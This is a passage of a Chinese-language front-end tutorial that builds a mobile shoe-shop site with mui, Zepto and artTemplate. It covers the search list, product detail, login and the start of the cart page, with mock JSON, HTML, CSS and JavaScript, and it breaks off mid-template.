		"oldPrice": 888.1,
		"price": 499.1,
		"proDesc": "描述",
		"size": "40-50",
		"statu": 1,
		"updateTime": "2017-01-04T16:28:29.000Z",
		"num": 20,
		"brandId": 1,
		"pic": [{
			"id": 1,
			"picName": "product.jpg",
			"productId": 1,
			"picAddr": "/mobile/images/product.jpg"
		}, {
			"id": 7,
			"picName": "/mobile/images/detail.jpg",
			"productId": 1,
			"picAddr": "/mobile/images/detail.jpg"
		}]
	}, {
		"id": 2,
		"proName": "李宁闪击篮球鞋驭帅10镭射队尚4男韦德之道空袭中高帮队尚3.5球鞋",
		"oldPrice": 888.1,
		"price": 499.1,
		"proDesc": "描述",
		"size": "35-45",
		"statu": 1,
		"updateTime": "2017-01-04T16:28:29.000Z",
		"num": 20,
		"brandId": 1,
		"pic": [{
			"id": 2,
			"picName": "detail.jpg",
			"productId": 2,
			"picAddr": "/mobile/images/detail.jpg"
		}]
	}, {
		"id": 3,
		"proName": "Sport飓风 Nike Kwazi 休闲运动鞋男 844839-002-001-100-400",
		"oldPrice": 888.1,
		"price": 499.1,
		"proDesc": "描述",
		"size": "30-50",
		"statu": 1,
		"updateTime": "2017-01-04T16:28:29.000Z",
		"num": 20,
		"brandId": 1,
		"pic": [{
			"id": 3,
			"picName": "detail.jpg",
			"productId": 3,
			"picAddr": "/mobile/images/detail.jpg"
		}]
	}, {
		"id": 4,
		"proName": "指南针运动 NIKE HYPERSHIFT篮球鞋 844392-010-607-164-017现货",
		"oldPrice": 888.1,
		"price": 499.1,
		"proDesc": "描述",
		"size": "40-55",
		"statu": 1,
		"updateTime": "2017-01-04T16:28:29.000Z",
		"num": 20,
		"brandId": 1,
		"pic": [{
			"id": 4,
			"picName": "/mobile/images/detail.jpg",
			"productId": 4,
			"picAddr": "/mobile/images/detail.jpg"
		}]
	}],
	"count": 6
}
```
>[danger] ##### searchList.js
```
1.页面初始化的时候：关键字在输入框内显示,获取页面搜索页关键字
2..页面初始化的时候：根据关键字查询第一页数据4条
3.用户点击搜索的时候 根据新的关键字搜索商品 重置排序功能
4.用户点击排序的时候  根据排序的选项去进行排序（默认的时候是 降序  再次点击的时候 升序）
5.用户下拉的时候  根据当前条件刷新 上拉加载重置  排序功能也重置
6.用户上拉的时候  加载下一页（没有数据不去加载了）
```
* 获取搜索页连接中的关键字，分装到通用js文件中common.js
```
// js中的替换只能替换一次，所以讲?替换成空，在利用&分割，利用=进行对象重组
/**
 * 1. 先获取 连接中search中搜索词
 * 2. 判断是否有搜索词
 * 3. 如果有将搜索词变成对象的形式返回给接口端
 * **/

window.CT = {}
CT.getParamsByUrl =function () {
    var search = location.search;
    var params = {};
    if(search){
        var search = search.replace('?','');
        var arr = search.split('&');
        arr.forEach(function (item,i) {
            var itemArr = item.split("=");
            // 在已知的切割数据情况下 直接使用切片 不用使用循环
            params[itemArr[0]] = itemArr[1]
        })
    }
    return params

};
```
* sreachList.js
```
$(function () {
    /*区域滚动*/
    mui('.mui-scroll-wrapper').scroll({
        indicators: false
    });

    /*1.页面初始化的时候：关键字在输入框内显示*/
    /*获取关键字*/
    var urlParams = CT.getParamsByUrl();
    var $input = $('input').val(urlParams.key || '');

    /*2.页面初始化的时候：根据关键字查询第一页数据4条*/
    /*下拉刷新配置自动执行  重复操作*/
    /*getSearchData({
        proName: urlParams.key,
        page: 1,
        pageSize: 4
    }, function (data) {
        /!*渲染数据*!/
        $('.ct_product').html(template('list', data));
    });*/

    /*3.用户点击搜索的时候 根据新的关键字搜索商品 重置排序功能*/
    $('.ct_search a').on('tap', function () {
        var key = $.trim($input.val());
        if (!key) {
            mui.toast('请输入关键字');
            return false;
        }
        getSearchData({
            proName: key,
            page: 1,
            pageSize: 4
        }, function (data) {
            /*渲染数据*/
            $('.ct_product').html(template('list', data));
        });
    });

    /*4.用户点击排序的时候  根据排序的选项去进行排序（默认的时候是 降序  再次点击的时候 升序）*/
    $('.ct_order a').on('tap', function () {
        /*当前点击的A*/
        var $this = $(this);
        /*如果之前没有选择*/
        if (!$this.hasClass('now')) {
            /*选中，其他的不选中，箭头默认朝下*/
            $this.addClass('now').siblings().removeClass('now')
                .find('span').removeClass('fa-angle-up').addClass('fa-angle-down');
        }
        /*有now的时候*/
        else {
            /*改当前的箭头方向*/
            if ($this.find('span').hasClass('fa-angle-down')) {
                $this.find('span').removeClass('fa-angle-down').addClass('fa-angle-up');
            } else {
                $this.find('span').removeClass('fa-angle-up').addClass('fa-angle-down');
            }
        }
        /*获取当前点击的功能参数  price 1 2 num 1 2*/
        var order = $this.attr('data-order');
        var orderVal = $this.find('span').hasClass('fa-angle-up') ? 1 : 2;
        var key = $.trim($input.val());
        if (!key) {
            mui.toast('请输入关键字');
            return false;
        }
        /*获取数据*/
        var params = {
            proName: key,
            page: 1,
            pageSize: 4
            /*排序的方式*/
        };
        params[order] = orderVal;
        getSearchData(params, function (data) {
            /*渲染数据*/
            $('.ct_product').html(template('list', data));
        });
    });

    /*5.用户下拉的时候  根据当前条件刷新 上拉加载重置  排序功能也重置 */
    mui.init({
        pullRefresh: {
            /*下拉容器*/
            container: "#refreshContainer",
            /*下拉*/
            down: {
                /*最近跟新的功能*/
                /*style:'circle',*/
                /*自动加载*/
                auto: true,
                callback: function () {
                    /*组件对象*/
                    var that = this;
                    var key = $.trim($input.val());
                    if (!key) {
                        mui.toast('请输入关键字');
                        return false;
                    }

                    /*排序功能也重置*/
                    $('.ct_order a').removeClass('now').find('span').removeClass('fa-angle-up').addClass('fa-angle-down');

                    getSearchData({
                        proName: key,
                        page: 1,
                        pageSize: 4
                    }, function (data) {
                        setTimeout(function () {
                            /*渲染数据*/
                            $('.ct_product').html(template('list', data));
                            /*注意：停止下拉刷新*/
                            that.endPulldownToRefresh();
                            /*上拉加载重置*/
                            that.refresh(true);
                        }, 1000);
                    });
                }
            },
            /*上拉*/
            up: {
                callback:function () {
                    window.page ++;
                    /*组件对象*/
                    var that = this;
                    var key = $.trim($input.val());
                    if (!key) {
                        mui.toast('请输入关键字');
                        return false;
                    }

                    /*获取当前点击的功能参数  price 1 2 num 1 2*/
                    var order = $('.ct_order a.now').attr('data-order');
                    var orderVal = $('.ct_order a.now').find('span').hasClass('fa-angle-up') ? 1 : 2;
                    /*获取数据*/
                    var params = {
                        proName: key,
                        page: window.page,
                        pageSize: 4
                        /*排序的方式*/
                    };
                    params[order] = orderVal;
                    getSearchData(params, function (data) {
                        setTimeout(function () {
                            /*渲染数据*/
                            $('.ct_product').append(template('list', data));
                            /*注意：停止上拉加载*/
                            if(data.data.length){
                                that.endPullupToRefresh();
                            }else{
                                that.endPullupToRefresh(true);
                            }

                        }, 1000);
                    });
                }
            }
        }
    });
    /*6.用户上拉的时候  加载下一页（没有数据不去加载了）*/


});
var getSearchData = function (params, callback) {
    $.ajax({
        url: '/product/queryProduct',
        type: 'get',
        data: params,
        dataType: 'json',
        success: function (data) {
            /*存当前页码*/
            window.page = data.page;
            callback && callback(data);
        }
    });
};
```
>[danger] ##### 分析sreachList.js
```
// 1.可以利用|| 的特性来代替if 判断
var urlParams = CT.getParamsByUrl();
var $input = $('input').val(urlParams.key || '');

// 2. 当点击事件不符合判断条件时 增加 return flase 
var $this = $(this);
var key = $.trim($input.val());
if(!key){
    mui.toast('请输入关键字');
    return false
}

// 3.在html 中隐藏 关键使用时直接获取
<a href="javascript:;" data-order="time">上架时间 <span class="fa fa-angle-down"></span></a>
<a href="javascript:;" data-order="price">价格 <span class="fa fa-angle-down"></span></a>
var order = $this.attr('data-order');
var orderVal = $this.find('span').hasClass('fa-angle-up') ? 1 : 2;
```
>[success] # 商品页
```
1.点击搜索列表页内容，跳转到商品页
```
![](https://box.kancloud.cn/bf2861df9b5ece9e822e81cfe48cc839_273x491.png)
![](https://box.kancloud.cn/e42f24a1cfe794ed9cb9b70d1fc05a85_291x497.png)
>[danger] ##### product.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords" content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/product.css">
    <title>传淘</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>商品详情</h3>
        <a href="index.html" class="right"><span class="fa fa-home"></span></a>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <div class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <!--图片轮播-->
                    <div class="mui-slider">
                        <!--首尾加一张   mui-slider-loop -->
                        <div class="mui-slider-group mui-slider-loop">
                            <div class="mui-slider-item mui-slider-item-duplicate">
                                <a href="#"><img src="images/detail.jpg" alt=""></a>
                            </div>
                            <div class="mui-slider-item">
                                <a href="#"><img src="images/detail.jpg" alt=""></a>
                            </div>
                            <div class="mui-slider-item">
                                <a href="#"><img src="images/detail.jpg" alt=""></a>
                            </div>
                            <div class="mui-slider-item mui-slider-item-duplicate">
                                <a href="#"><img src="images/detail.jpg" alt=""></a>
                            </div>
                        </div>
                        <div class="mui-slider-indicator">
                            <div class="mui-indicator mui-active"></div>
                            <div class="mui-indicator"></div>
                        </div>
                    </div>

                    <div class="p_title">匡威三星标1970s converse复刻 142334c 144757c三星标黑色高帮</div>
                    <div class="p_price">

                        价格：<strong class="present">¥499.1</strong>
                        <del class="original">¥888.1</del>
                    </div>
                    <div class="p_size">
                        尺码：
                        <span class="btn_size">40</span>
                        <span class="btn_size">41</span>
                        <span class="btn_size">42</span>
                        <span class="btn_size">43</span>
                        <span class="btn_size">44</span>
                        <span class="btn_size">45</span>
                        <span class="btn_size">46</span>
                        <span class="btn_size">47</span>
                        <span class="btn_size">48</span>
                        <span class="btn_size">49</span>
                        <span class="btn_size">50</span>
                    </div>
                    <div class="p_number">
                        数量：
                        <span class="jian">-</span><input readonly="" type="text" value="0" data-max="20"><span class="jia">+</span>
                        剩余：20 件
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="p_option">
        <a href="cart.html" class="btn_cart fa fa-shopping-cart"></a>
        <a href="javascript:;" class="btn_addCart">加入购物车</a>
        <a href="javascript:;" class="btn_pay">立即购买</a>
    </div>
</div>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="js/index.js"></script>
</body>
</html>
```
>[danger] ##### product.css
```
.p_title{
    font-weight: normal;
    padding: 15px 15px;
    font-size: 18px;
    border-bottom: 1px solid #e6e6e6;
}
.p_price{
    border-bottom: 1px solid #e6e6e6;
    padding: 12px 5px;
    font-size: 14px;
}
.p_price {
    padding: 12px 5px;
    border-bottom: 1px solid #e6e6e6;
    font-size: 14px;
}
.p_price .present {
    font-size: 24px;
    color: #ea543d;
}

.p_price .original {
    margin-left: 10px;
    color: #afafaf;
}

.p_size{
    padding: 10px 5px;
    border-bottom: 1px solid #ccc;
    font-size: 14px;
}
.p_size .btn_size{
    width: 28px;
    height: 28px;
    display: inline-block;
    text-align: center;
    cursor: pointer;
    border: 1px solid #ccc;
    margin-bottom: 10px;
    vertical-align: middle;
}

.p_size .btn_size.now{
    background: #fa672d;
}

.p_number{
    padding: 10px 5px;
    border-bottom: 1px solid #ccc;
    font-size: 14px;
}
.p_number .jian,.p_number .jia{
    width: 28px;
    height: 28px;
    line-height: 28px;
    display: inline-block;
    text-align: center;
    cursor: pointer;
    border: 1px solid #ccc;
    vertical-align: middle;
}
.p_number input{
    width: 28px;
    height: 28px;
    line-height: 28px;
    display: inline-block;
    border-radius: 0;
    border: none;
    border-top: 1px solid #ccc;
    border-bottom: 1px solid #ccc;
    margin: 0;
    padding: 0;
    vertical-align: middle;
    text-align: center;
}


.p_option{
    height: 50px;
    width: 100%;
    position: absolute;
    bottom: 0;
    left: 0;
    z-index: 997;
    padding-left: 62px;
    border-top: 1px solid #ccc;
    background-color: #e6e6e6;
}

.p_option .btn_cart{
    position: absolute;
    left: 15px;
    top: 13px;
    font-size: 20px;
    color: #333;
}
.p_option .btn_addCart,.p_option .btn_pay{
    width: 48%;
    height: 39px;
    line-height: 39px;
    margin-top: 5px;
    float: left;
    border: 0;
    background-color: #991020;
    text-align: center;
    font-size: 16px;
    color: #fff;
    outline: none;
    border-radius: 2px;
}
.p_option .btn_pay{
    float: right;
    margin-right: 6px;
    background-color: #fa672d;
}


/*加载动画 rotateLoading 随便起的动画名称*/
.loading{
    text-align: center;
    padding-top:200px;
}
.loading .mui-icon-spinner{
    color: #006699;
    animation: rotateLoading 1s linear infinite;
}
@keyframes rotateLoading {
    from{
    }
    to{
        transform: rotate(360deg);
        -webkit-transform: rotate(360deg);
    }
}
```
>[danger] ##### 动态生成 js代码
```
$(function () {
    // 获取连接上的产品id
    var id = CT.getParamsByUrl().productId;
    getProductData(id, function (data) {
        // 去掉 页面加载的转圈图标
        $('.loading').remove();
        $('.mui-scroll').html(template('detail', data));
        mui('.mui-slider').slider({
            interval: 2000
        });
        /*区域滚动*/
        mui('.mui-scroll-wrapper').scroll({
            indicators: false
        });

    })
});
var getProductData = function (productId, callback) {
    $.ajax({
        url:'/product/queryProductDetail',
        type:'get',
        data:{
            id:productId
        },
        dataType:'json',
        success:function (data) {
            callback && callback(data)
        }
    })
}
```
>[danger] ##### 动态生成的页面模板
```
1模板设置当图片不存在时候默认的图片对象
  <%
    if(!pic || !pic.length){
    pic = [{picAddr:'images/none01.jpg'}];
    }
 %>
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘..">
    <meta name="Keywords" content="乐淘 ">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/product.css">
    <title>传淘</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>商品详情</h3>
        <a href="index.html" class="right"><span class="fa fa-home"></span></a>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <div class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <!--TODO-->
                    <div class="loading">
                        <span class="mui-icon mui-icon-spinner mui-spin"></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="p_option">
        <a href="cart.html" class="btn_cart fa fa-shopping-cart"></a>
        <a href="javascript:;" class="btn_addCart">加入购物车</a>
        <a href="javascript:;" class="btn_pay">立即购买</a>
    </div>
</div>
<script type="text/template" id="detail">
    <%
    if(!pic || !pic.length){
    pic = [{picAddr:'images/none01.jpg'}];
    }
    %>
    <div class="mui-slider">
        <div class="mui-slider-group mui-slider-loop">
            <div class="mui-slider-item mui-slider-item-duplicate">
                <a href="#"><img src="<%=pic[pic.length-1].picAddr%>" alt=""></a>
            </div>
            <% for( var i = 0 ; i < pic.length ; i++ ){ %>
            <div class="mui-slider-item">
                <a href="#"><img src="<%=pic[i].picAddr%>" alt=""></a>
            </div>
            <% } %>
            <div class="mui-slider-item mui-slider-item-duplicate">
                <a href="#"><img src="<%=pic[0].picAddr%>" alt=""></a>
            </div>
        </div>
        <div class="mui-slider-indicator">
            <% for( var i = 0 ; i < pic.length ; i++ ){ %>
            <div class="mui-indicator <%=i==0?'mui-active':''%>"></div>
            <% } %>
        </div>
    </div>
    <div class="p_title"><%=proName%></div>
    <div class="p_price">
        价格：<strong class="present">¥<%=price%></strong>
        <del class="original">¥<%=oldPrice%></del>
    </div>
    <div class="p_size">
        尺码：
        <% var sizeArr = size.split('-'); %>
        <% for( var i = sizeArr[0]; i<= sizeArr[1] ; i ++ ){ %>
        <span class="btn_size"><%=i%></span>
        <% } %>
    </div>
    <div class="p_number">
        数量：
        <span class="jian">-</span><input readonly="" type="text" value="0" data-   max="<%=num%>"><span class="jia">+</span>
        剩余：<%=num%> 件
    </div>
</script>

<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="js/product.js"></script>
<script src="js/common.js"></script>
</body>
</html>











<!--<div class="mui-slider">-->
    <!--&lt;!&ndash;首尾加一张   mui-slider-loop &ndash;&gt;-->
    <!--<div class="mui-slider-group mui-slider-loop">-->
        <!--<div class="mui-slider-item mui-slider-item-duplicate">-->
            <!--<a href="#"><img src="images/detail.jpg" alt=""></a>-->
        <!--</div>-->
        <!--<div class="mui-slider-item">-->
            <!--<a href="#"><img src="images/detail.jpg" alt=""></a>-->
        <!--</div>-->
        <!--<div class="mui-slider-item">-->
            <!--<a href="#"><img src="images/detail.jpg" alt=""></a>-->
        <!--</div>-->
        <!--<div class="mui-slider-item mui-slider-item-duplicate">-->
            <!--<a href="#"><img src="images/detail.jpg" alt=""></a>-->
        <!--</div>-->
    <!--</div>-->
    <!--<div class="mui-slider-indicator">-->
        <!--<div class="mui-indicator mui-active"></div>-->
        <!--<div class="mui-indicator"></div>-->
    <!--</div>-->
<!--</div>-->

<!--<div class="p_title">匡威三星标1970s converse复刻 142334c 144757c三星标黑色高帮</div>-->
<!--<div class="p_price">-->

    <!--价格：<strong class="present">¥499.1</strong>-->
    <!--<del class="original">¥888.1</del>-->
<!--</div>-->
<!--<div class="p_size">-->
    <!--尺码：-->
    <!--<span class="btn_size">40</span>-->
    <!--<span class="btn_size">41</span>-->
    <!--<span class="btn_size">42</span>-->
    <!--<span class="btn_size">43</span>-->
    <!--<span class="btn_size">44</span>-->
    <!--<span class="btn_size">45</span>-->
    <!--<span class="btn_size">46</span>-->
    <!--<span class="btn_size">47</span>-->
    <!--<span class="btn_size">48</span>-->
    <!--<span class="btn_size">49</span>-->
    <!--<span class="btn_size">50</span>-->
<!--</div>-->
<!--<div class="p_number">-->
    <!--数量：-->
    <!--<span class="jian">-</span><input readonly="" type="text" value="0" data-max="20"><span class="jia">+</span>-->
    <!--剩余：20 件-->
<!--</div>-->
```
>[danger] ##### 封装登陆ajax 
```
1.封装的登陆对象ajax，判断当前用户是否登录，在url做了用户之前访问页的拼接
2.在else成功登陆中存放了回调函数的使用
```
```
/*需要登录的ajax请求*/
CT.loginUrl = '/m/user/login.html';
CT.cartUrl = '/m/user/cart.html';
CT.loginAjax = function (params) {
    /*params====> {} */
    $.ajax({
        type: params.type || 'get',
        url: params.url || '#',
        data: params.data || '',
        dataType: params.dataType || 'json',
        success:function (data) {
            /*未登录的处理 {error: 400, message: "未登录！"}
            所有的需要登录的接口 没有登录返回这个数据*/
            if(data.error == 400){
                /*跳到登录页  把当前地址传递给登录页面  当登录成功按照这个地址跳回来*/
                location.href = CT.loginUrl + '?returnUrl=' + location.href;
                return false;
            }else{
                params.success && params.success(data);
            }
        },
        error:function () {
            mui.toast('服务器繁忙');
        }
    });
};
```
>[danger] ##### 商品页的js
```
1.尺码的选择
2.数量的选择
3. 加人购物车
```
```
$(function () {
    var id = CT.getParamsByUrl().productId;
    getProductData(id, function (data) {
        /*清除加载状态*/
        $('.loading').remove();
        /*渲染商品详情页*/
        $('.mui-scroll').html(template('detail', data));
        /*轮播图*/
        mui('.mui-slider').slider({
            interval: 2000
        });
        /*区域滚动*/
        mui('.mui-scroll-wrapper').scroll({
            indicators: false
        });
        /*1.尺码的选择*/
        $('.btn_size').on('tap', function () {
            $(this).addClass('now').siblings().removeClass('now');
        });
        /*2.数量的选择*/
        $('.p_number span').on('tap', function () {
            var $input = $(this).siblings('input');
            var currNum = $input.val();
            /*字符串 转数字 */
            var maxNum = parseInt($input.attr('data-max'));
            if ($(this).hasClass('jian')) {
                if(currNum == 0){
                    return false;
                }
                currNum--;
            } else {
                /*不超库存*/
                if(currNum >= maxNum){
                    /*消息框点击的时候会消失 正好和加号在一块  (击穿 tap,点击穿透)*/
                    setTimeout(function () {
                        mui.toast('库存不足');
                    },100);
                    return false;
                }
                currNum++;
            }
            $input.val(currNum);
        });
        /*3.加人购物车*/
        $('.btn_addCart').on('tap',function () {
            /*数据校验*/
            var $changeBtn = $('.btn_size.now');
            if(!$changeBtn.length){
                mui.toast('请您选择尺码');
                return false;
            }
            var num = $('.p_number input').val();
            if( num <= 0){
                mui.toast('请您选择数量');
                return false;
            }
            /*提交数据*/
            CT.loginAjax({
                url:'/cart/addCart',
                type:'post',
                data:{
                    productId:id,
                    num:num,
                    size:$changeBtn.html()
                },
                dataType:'json',
                success:function (data) {
                    if(data.success == true){
                        /*弹出提示框*/
                        /*content*/
                        /*title*/
                        /*btn text []*/
                        /*click btn callback */
                        mui.confirm('添加成功，去购物车看看？', '温馨提示', ['是', '否'], function(e) {
                            if (e.index == 0) {
                                location.href = CT.cartUrl;
                            } else {
                                //TODO
                            }
                        })
                    }
                }
            });
        });
    })
});
var getProductData = function (productId, callback) {
    $.ajax({
        url: '/product/queryProductDetail',
        type: 'get',
        data: {
            id: productId
        },
        dataType: 'json',
        success: function (data) {
            setTimeout(function () {
                callback && callback(data);
            }, 1000);
        }
    });
};
```
>[success] # 用户登录页
![](https://box.kancloud.cn/f4a80b914dc5472907ff90e8a6854d54_325x488.png)
>[danger] ##### 登陆的html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘..">
    <meta name="Keywords" content="乐淘">
    <link type="image/x-icon" rel="shortcut icon" href="../images/favicon.ico">
    <link rel="stylesheet" href="../assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="../assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="../css/common.css">
    <link rel="stylesheet" href="../css/user.css">
    <title>login</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>login</h3>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <form class="mui-input-group">
                <div class="mui-input-row">
                    <label>用户名</label>
                    <input name="username" type="text" class="mui-input-clear" placeholder="请输入用户名">
                </div>
                <div class="mui-input-row">
                    <label>密码</label>
                    <input name="password" type="password" class="mui-input-password" placeholder="请输入密码">
                </div>
                <div class="mui-button-row">
                    <button id="submit" type="button" class="mui-btn mui-btn-primary" >确认</button>
                    <button type="button" class="mui-btn mui-btn-danger" >取消</button>
                </div>
            </form>
        </div>
    </div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home now" href="../index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars" href="../category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart" href="../user/cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="../user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<script src="../assets/mui/js/mui.min.js"></script>
<script src="../assets/zepto/zepto.min.js"></script>
<script src="../js/common.js"></script>
<script src="../js/login.js"></script>
</body>
</html>
```
>[danger] ##### 把serialize 转换成对象的方法封装
```
CT.serialize2object = function (serializeStr) {
    var obj = {};
    /*key=value&k=v*/
    if(serializeStr){
        var arr = serializeStr.split('&');
        arr.forEach(function (item,i) {
            var itemArr = item.split('=');
            obj[itemArr[0]] = itemArr[1];
        })
    }
    return obj;
}
```
>[danger] #### 登陆js
* 编写登陆的 ajax 思路
```
1.用serialize 获取数据
2.将数据转换成对象
3.对数据进行校验
4.通过ajax传入后台判断用户名密码是否正确
5.在ajax success 函数中逻辑是判断是否是其从其他页面登陆，如果是登陆成功跳转 类似链接：http://localhost:3000/m/user/login.html?returnUrl=http://localhost:3000/m/product.html?productId=1#
其中returnUrl 是自己约定的拼装
```
```
$(function () {

    $('#submit').on('tap',function () {
        /*1. get form serialize serializeArray(array ) data*/
        /*2. name attr */
        var data = $('form').serialize();
        console.log(data);
        /*3. valid */
        /*4. data type string "key=value&k=v" ====>  {key:value,k:v} */
        var dataObject = CT.serialize2object(data);
        console.log(dataObject);

        /*“JSON”未定义 IE67  https://github.com/douglascrockford/JSON-js (josn2.js)*/
        /*检验*/
        if(!dataObject.username){
            mui.toast('请您输入用户名');
            return false;
        }
        if(!dataObject.password){
            mui.toast('请您输入密码');
            return false;
        }

        $.ajax({
            type:'post',
            url:'/user/login',
            /*对象 serialize serializeArray*/
            data:dataObject,
            dataType:'json',
            success:function (data) {
                /*如果成功 根据地址跳转*/
                /*如果没有地址 默认跳转个人中心首页*/
                if(data.success == true){
                    /*业务成功*/
                    var returnUrl = location.search.replace('?returnUrl=','');
                    if(returnUrl){
                        location.href = returnUrl;
                    }else{
                        location.href = CT.userUrl;
                    }
                }else{
                    /*业务不成功*/
                    mui.toast(data.message);
                }
            }
        });
    })

});
```
>[success] # 购物车页
```
1.购物车可以进行展示
2.进行数据编辑
3.进行数据删除
4.展示总金额
```
![](https://box.kancloud.cn/d9832a5bc9f83a22b606406357884bec_338x520.png)
![](https://box.kancloud.cn/abe4dbdb1f74c08203f615d3d5bf3574_295x492.png)
>[danger] cart.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克、阿迪达斯、李宁、匡威等国内外知名品牌的篮球鞋,板鞋,休闲鞋,跑步鞋,帆布...">
    <meta name="Keywords" content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋 足球鞋 休闲鞋 凉鞋 户外鞋 布洛克 高跟鞋 单鞋 豆豆鞋 乐福鞋 牛津鞋 凉拖 皮鞋 短靴 长靴 登山鞋 徒步鞋 硫化鞋 训练鞋 溯溪鞋 越野鞋 板鞋 足球鞋 网球鞋 赛车鞋 雪地靴 马丁靴 商务 英伦">
    <link type="image/x-icon" rel="shortcut icon" href="../images/favicon.ico">
    <link rel="stylesheet" href="../assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="../assets/fontAwesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="../css/common.css">
    <link rel="stylesheet" href="../css/cart1.css">
    <title>传淘-购物车</title>
</head>
<body>
<!--首页内容-->
<div class="ct_container">
    <header class="ct_header">
        <a href="javascript:history.back();" class="left"><span class="fa fa-arrow-left"></span></a>
        <h3>购物车</h3>
        <a href="javascript:;" class="right"><span class="fa fa-refresh"></span></a>
    </header>
    <div class="ct_content">
        <div class="ct_wrapper">
            <div id="refreshContainer" class="mui-scroll-wrapper">
                <div class="mui-scroll">
                    <ul class="mui-table-view">

                    </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="cart_order">订单总额：¥<span id="cartAmount">0.00</span> <a href="javascript:;">生成订单</a></div>
    <footer class="ct_footer">
        <a class="tab_home fa fa-home" href="index.html"><span>首页</span></a>
        <a class="tab_cate fa fa-bars" href="category.html"><span>分类</span></a>
        <a class="tab_cart fa fa-shopping-cart  now" href="cart.html"><span>购物车</span></a>
        <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
    </footer>
</div>
<script type="text/template" id="cart">
    <% for(var i = 1 ; i < data.length ; i ++){ %>
    <% var item = data[i]; %>
    <li data-product class="mui-table-view-cell mui-media">
        <div class="mui-slider-right mui-disabled" data-id="<%=item.id%>">
            <a class="mui-btn mui-btn-blue mui-icon mui-icon-compose"></a>
            <a class="mui-btn mui-btn-red mui-icon mui-icon-trash"></a>
        </div>
        <div class="mui-slider-handle">
            <a href="javascript:;" class="">
                <%
                var addr = '../images/none01.jpg';
